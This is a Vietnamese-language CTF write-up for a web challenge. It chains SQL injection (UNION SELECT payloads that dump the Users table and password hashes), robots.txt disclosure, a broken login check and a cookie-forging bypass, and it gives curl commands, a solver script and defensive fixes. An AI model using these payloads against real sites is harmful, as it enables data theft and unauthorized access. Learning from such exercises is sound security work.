# Tony's Tools - Web CTF Challenge Writeup

**Flag:** `0xfun{T0ny'5_T00ly4rd._1_H0p3_Y0u_H4d_Fun_SQL1ng,_H45H_Cr4ck1ng,_4nd_W1th_C00k13_M4n1pu74t10n}`

**URL:** `http://chall.0xfun.org:43198/`

---

## Tổng quan

Đây là một bài web kết hợp nhiều lỗ hổng:
1. SQL Injection
2. Information Disclosure (robots.txt)
3. Broken Authentication Logic
4. Cookie Manipulation

---

## Bước 1: Khám phá ứng dụng

Truy cập trang web, ta thấy một trang bán dụng cụ "Tony's Tools" với:
- Trang chủ có chức năng tìm kiếm sản phẩm
- Trang đăng nhập `/login`

```bash
curl -s http://chall.0xfun.org:43198/
```

---

## Bước 2: SQL Injection tại /search

Thử inject single quote vào tham số `item`:

```bash
curl -s "http://chall.0xfun.org:43198/search?item='"
```

**Kết quả:** `unrecognized token: "';"`

→ **Xác nhận có SQL Injection!**

### Xác định số cột với UNION

```bash
curl -s "http://chall.0xfun.org:43198/search?item=' UNION SELECT 1,2--"
```

→ Thành công với 2 cột.

### Dump tên các bảng

```bash
curl -s "http://chall.0xfun.org:43198/search?item=' UNION SELECT name,sql FROM sqlite_master--"
```

**Kết quả:** Tìm thấy bảng `Users` và `Products`

### Dump dữ liệu bảng Users

```bash
curl -s "http://chall.0xfun.org:43198/search?item=' UNION SELECT username,password FROM Users--"
```

**Kết quả:**
| Username | Password (SHA256 hash) |
|----------|------------------------|
| Admin | 0000000000000000000000000000000000000000000000000000000000000000 |
| Jerry | 059a00192592d5444bc0caad7203f98b506332e2cf7abb35d684ea9bf7c18f08 |

→ Mật khẩu được hash bằng SHA256. Tuy nhiên không crack được.

---

## Bước 3: Information Disclosure - robots.txt

Kiểm tra file robots.txt:

```bash
curl -s http://chall.0xfun.org:43198/robots.txt
```

**Kết quả:**
```
User-agent: *
Disallow: /main.pyi
Disallow: /user
Disallow: /secret/hints.txt
```

→ Phát hiện 3 đường dẫn bị ẩn!

---

## Bước 4: Đọc source code

```bash
curl -s http://chall.0xfun.org:43198/main.pyi
```

**Source code quan trọng:**

```python
def is_logged_in(request):
    cookie = request.cookies.get("user")
    results = []
    conn = sqlite3.connect("file:database.db?mode=ro", uri=True)
    try:
        cursor = conn.cursor()
        query = "SELECT username, password FROM Users;"
        cursor.execute(query)
        results = cursor.fetchall()
    except Exception as e:
        errorOccured = True
        results = str(e)
    finally:
        cursor.close()
        conn.close()
    if not results: return False
    global SECRET_LOGIN_TOKEN
    for name, password in results:
        if sha256(f"{name}:{password}:{SECRET_LOGIN_TOKEN}".encode('utf-8')).hexdigest(): 
            return True  # BUG Ở ĐÂY!
    return False
```

### Lỗ hổng Broken Authentication

**Vấn đề:** Hàm `is_logged_in()` luôn trả về `True`!

Tại sao? Vì:
```python
if sha256(...).hexdigest(): return True
```

`sha256().hexdigest()` luôn trả về một chuỗi hex 64 ký tự → **Truthy value** → Luôn return `True`

Lập trình viên có lẽ muốn viết:
```python
if sha256(...).hexdigest() == cookie: return True
```

Nhưng đã quên so sánh với cookie!

---

## Bước 5: Đọc file hints.txt

```bash
curl -s http://chall.0xfun.org:43198/secret/hints.txt
```

**Kết quả:**
```
1. I wonder what that .pyi file was about?
2. I hope none of the normal users use common passwords...
   Hash Cracking's a pain.
3. I really like cookies. Eating them, baking them, giving them out; its all so fun.
```

→ Gợi ý về việc thao túng cookies!

---

## Bước 6: Cookie Manipulation - Khai thác

Xem endpoint `/user`:

```python
@app.route("/user", methods=["GET"])
def viewUser():
    userID = request.cookies.get("userID")
    if not is_logged_in(request) or not userID: 
        return make_response(redirect("/login"))
    try:
        userID = int(userID)
        with open("users/" + str(userID)) as f:
            return render_template("user.html", text=f.read().splitlines(), logged_in=True)
    except: 
        return render_template("user.html", text=[f"Error: {str(userID)} is not a valid user ID"], logged_in=True)
```

**Điều kiện bypass:**
1. `is_logged_in(request)` → Luôn `True` (do bug)
2. `userID` cookie phải tồn tại
3. `userID` phải là số nguyên hợp lệ

Admin có `UserID = 1` (đầu tiên trong database).

### Exploit

Chỉ cần set cookie `userID=1` và `user=anything`:

```bash
curl -s "http://chall.0xfun.org:43198/user" -b "userID=1;user=anyhash"
```

**Kết quả:**
```html
<p class="profile">0xfun{T0ny'5_T00ly4rd._1_H0p3_Y0u_H4d_Fun_SQL1ng,_H45H_Cr4ck1ng,_4nd_W1th_C00k13_M4n1pu74t10n}</p>
```

---

## Tổng kết chuỗi khai thác

```
1. SQL Injection (/search?item=')
   └── Dump bảng Users
   
2. robots.txt
   └── Tìm /main.pyi (source code)
   
3. Phân tích source code
   └── Phát hiện bug trong is_logged_in()
       └── sha256().hexdigest() luôn truthy
       
4. Cookie Manipulation
   └── Set userID=1, user=anything
   └── Truy cập /user
   └── GET FLAG!
```

---

## Script giải tự động

```python
import requests

TARGET = "http://chall.0xfun.org:43198"

# Bước 1: Bypass auth với cookies giả
cookies = {
    "userID": "1",      # Admin's ID
    "user": "anything"  # Bất kỳ giá trị nào (do bug)
}

# Bước 2: Truy cập /user
r = requests.get(f"{TARGET}/user", cookies=cookies)

# Bước 3: In flag
if "0xfun{" in r.text:
    import re
    flag = re.search(r"0xfun\{[^}]+\}", r.text)
    if flag:
        print(f"[+] FLAG: {flag.group()}")
else:
    print("[-] Không tìm thấy flag")
```

---

## Bài học rút ra

1. **Luôn kiểm tra robots.txt** - Có thể chứa đường dẫn nhạy cảm
2. **SQL Injection vẫn phổ biến** - Dùng parameterized queries
3. **Logic bugs nguy hiểm** - Code review kỹ authentication logic
4. **Cookie không đáng tin** - Luôn validate server-side

---

## Cách phòng chống

### Fix SQL Injection:
```python
# Sai
query = "SELECT ... WHERE name LIKE '%" + item + "%'"

# Đúng
query = "SELECT ... WHERE name LIKE ?"
cursor.execute(query, (f"%{item}%",))
```

### Fix Authentication Bug:
```python
# Sai
if sha256(...).hexdigest(): return True

# Đúng
if sha256(...).hexdigest() == cookie: return True
```

### Không expose source code:
- Không để file `.pyi` trong thư mục public
- Cấu hình web server chặn các file nhạy cảm
